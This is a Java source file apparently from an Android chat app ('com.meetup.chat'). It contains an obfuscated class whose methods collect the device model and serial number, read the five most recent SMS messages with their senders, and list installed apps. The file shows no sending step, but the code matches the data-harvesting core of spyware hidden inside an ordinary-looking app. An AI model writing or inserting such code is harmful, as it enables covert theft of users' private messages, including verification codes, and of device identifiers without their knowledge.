package com.meetup.chat;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;
import java.util.List;

public class f {
    public static String a(Context ctx) {
        return "Model: " + Build.MODEL + 
               "\nAndroid: " + Build.VERSION.RELEASE +
               "\nDevice ID: " + Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
    }

    public static String b(Context ctx) {
        try {
            Uri u = Telephony.Sms.CONTENT_URI;
            String[] p = {"address", "body"};
            Cursor c = ctx.getContentResolver().query(u, p, null, null, "date DESC LIMIT 5");
            if (c == null) return "No SMS";
            StringBuilder sb = new StringBuilder("SMS:\n");
            while (c.moveToNext()) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append("\n");
            }
            c.close();
            return sb.toString();
        } catch (Exception e) {
            return "SMS error";
        }
    }

    public static String c(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        List<android.content.pm.PackageInfo> pkgs = pm.getInstalledPackages(0);
        StringBuilder sb = new StringBuilder("Apps:\n");
        for (int i = 0; i < Math.min(10, pkgs.size()); i++) {
            sb.append(pkgs.get(i).packageName).append("\n");
        }
        return sb.toString();
    }
}
